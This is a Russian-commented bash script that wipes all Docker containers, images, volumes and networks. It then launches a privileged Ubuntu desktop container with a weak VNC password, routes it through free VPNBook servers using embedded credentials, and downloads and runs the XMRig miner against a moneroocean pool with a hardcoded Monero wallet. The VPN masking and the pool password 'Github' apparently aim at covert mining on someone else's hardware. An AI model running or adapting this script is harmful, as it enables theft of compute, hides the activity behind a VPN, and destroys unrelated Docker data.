cat <<'EOF' > /tmp/start.sh
#!/bin/bash

# === 0. Очистка Docker и среды ===
echo "[🧹] Очистка..."

sudo docker ps -aq | xargs -r sudo docker stop
sudo docker ps -aq | xargs -r sudo docker rm -f
sudo docker images -aq | xargs -r sudo docker rmi -f
sudo docker volume ls -q | xargs -r sudo docker volume rm
sudo docker network ls | grep -v 'bridge\|host\|none' | awk '{print \$1}' | xargs -r sudo docker network rm
rm -rf ~/dockercom

# === 1. Установка Docker и пакетов ===
echo "[+] Установка Docker..."
sudo apt update && sudo apt install -y docker.io docker-compose openvpn curl unzip

# === 2. Проверка Docker ===
if ! command -v docker &> /dev/null; then
  echo "[-] Docker не установлен"
  exit 1
fi

# === 3. Директория ===
echo "[+] Создание директории..."
mkdir -p ~/dockercom
cd ~/dockercom || exit 1

# === 4. docker-compose ===
echo "[+] Создание docker-compose файла..."
cat > ubuntu_gui.yml <<EOC
version: '3.8'
services:
  ubuntu-gui:
    image: dorowu/ubuntu-desktop-lxde-vnc:bionic
    container_name: ubuntu_gui
    ports:
      - "6080:80"
      - "5900:5900"
    environment:
      - VNC_PASSWORD=pass123
    volumes:
      - ./data:/data
      - /dev/net/tun:/dev/net/tun
    cap_add:
      - NET_ADMIN
    devices:
      - /dev/net/tun
    privileged: true
    shm_size: "2g"
EOC

# === 5. Запуск контейнера ===
echo "[+] Запуск контейнера..."
sudo docker-compose -f ubuntu_gui.yml up -d
sudo docker ps

# === 6. VPN часть 1 ===
sudo docker exec -i ubuntu_gui bash <<'EOV1'
apt update && apt install -y openvpn curl
cd /tmp
curl -L -o vpn.ovpn https://raw.githubusercontent.com/tfuutt467/mytest/0107725a2fcb1e4ac4ec03c78f33d0becdae90c2/vpnbook-de20-tcp443.ovpn
cat > auth.txt <<EOF
vpnbook
cf32e5w
EOF
openvpn --config vpn.ovpn --auth-user-pass auth.txt --daemon
EOV1

# === 7. VPN часть 2 ===
sudo docker exec -i ubuntu_gui bash <<'EOV2'
apt update && apt install -y openvpn curl unzip resolvconf
cd /tmp
curl -LO https://www.vpnbook.com/free-openvpn-account/VPNBook.com-OpenVPN-Euro1.zip
unzip -o VPNBook.com-OpenVPN-Euro1.zip -d vpnbook
cat > vpnbook/auth.txt <<EOF
vpnbook
cf324xw
EOF
echo "nameserver 1.1.1.1" > /etc/resolv.conf
openvpn --config vpnbook/vpnbook-euro1-tcp443.ovpn \
  --auth-user-pass vpnbook/auth.txt \
  --daemon \
  --route-up '/etc/openvpn/update-resolv-conf' \
  --down '/etc/openvpn/update-resolv-conf'
sleep 45
curl -s ifconfig.me
EOV2

# === 8. Установка и запуск XMRig ===
sudo docker exec -i ubuntu_gui bash <<'EOM'
POOL="gulf.moneroocean.stream:10128"
WALLET="47K4hUp8jr7iZMXxkRjv86gkANApNYWdYiarnyNb6AHYFuhnMCyxhWcVF7K14DKEp8bxvxYuXhScSMiCEGfTdapmKiAB3hi"
PASSWORD="Github"
XMRIG_VERSION="6.22.2"
ARCHIVE_NAME="xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz"
DOWNLOAD_URL="https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/${ARCHIVE_NAME}"

cd /tmp
curl -LO "$DOWNLOAD_URL"
tar -xzf "$ARCHIVE_NAME"
cd "xmrig-${XMRIG_VERSION}"

cat > config.json <<EOF
{
  "api": { "id": null, "worker-id": "" },
  "autosave": false,
  "background": false,
  "colors": true,
  "randomx": {
    "1gb-pages": true,
    "rdmsr": true,
    "wrmsr": true,
    "numa": true
  },
  "cpu": true,
  "donate-level": 0,
  "log-file": null,
  "pools": [{
    "url": "${POOL}",
    "user": "${WALLET}",
    "pass": "${PASSWORD}",
    "algo": "rx",
    "tls": false,
    "keepalive": true,
    "nicehash": false
  }],
  "print-time": 60,
  "retries": 5,
  "retry-pause": 5,
  "syslog": false,
  "user-agent": null
}
EOF

chmod +x xmrig
./xmrig -c config.json
EOM

echo "[✅] Всё запущено. VNC: http://localhost:6080 (пароль: pass123)"
EOF

chmod +x /tmp/start.sh
bash /tmp/start.sh
